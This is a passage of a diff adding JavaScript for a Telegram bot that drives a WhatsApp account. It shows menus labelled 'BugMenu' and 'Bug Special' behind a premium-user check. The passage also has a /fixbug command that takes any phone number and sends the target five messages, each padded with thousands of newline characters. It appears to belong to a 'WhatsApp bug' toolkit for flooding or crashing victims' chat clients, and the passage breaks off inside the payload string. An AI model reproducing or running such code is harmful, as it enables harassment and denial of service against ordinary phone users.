+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+ PRESS ALL BUTTON BELOW 
+\`\`\`
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ Control😛 ⌟",
+                callback_data: "/menu"
+            }
+        ],
+        [
+            {
+                text: "⌜ BugMenu🫨 ⌟",
+                callback_data: "/bugmenu"
+            }
+        ],
+        [
+            {
+                text: "⌜ Bug Special🔥 ⌟",
+                callback_data: "/specialmenu"
+            }
+        ],
+        [
+            {
+                text: "⌜ My Info📃 ⌟",
+                callback_data: "/infomenu"
+            }
+        ],
+        [
+            {
+                text: "⌜ Thank To🌟 ⌟",
+                callback_data: "/thankto"
+            }
+        ],
+        [
+            {
+                text: "⌜ Back✅ ⌟",
+                callback_data: "/start"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(allMenu, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+// ========================= [ TELEGRAM BOT COMMANDS ] =========================
+bot.command("fixbug", checkWhatsAppConnection, checkPremium, async ctx => {
+    const q = ctx.message.text.split(" ")[1];
+    const userId = ctx.from.id;
+    
+    if (!isPremiumUser(ctx.from.id)) {
+        ctx.reply("❌ Maaf, fitur ini hanya untuk pengguna premium.");
+    }
+    
+    if (!q) {
+        return ctx.reply(`Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
+    }
+    
+    let pepec = q.replace(/[^0-9]/g, "");
+    if (pepec.startsWith('0')) {
+        return ctx.reply(`Contoh : /fixbug 62xxx`);
+    }
+    
+    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    
+    try {
+        for (let i = 0; i < 5; i++) {
+            await dnz.sendMessage(target, { 
+                text: "𝙲𝙻𝙴𝙰𝚁 𝙱𝚄𝙶 𝙱𝚈 𝙶𝙰𝙼𝙴 𝙾𝚅𝙴𝚁\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n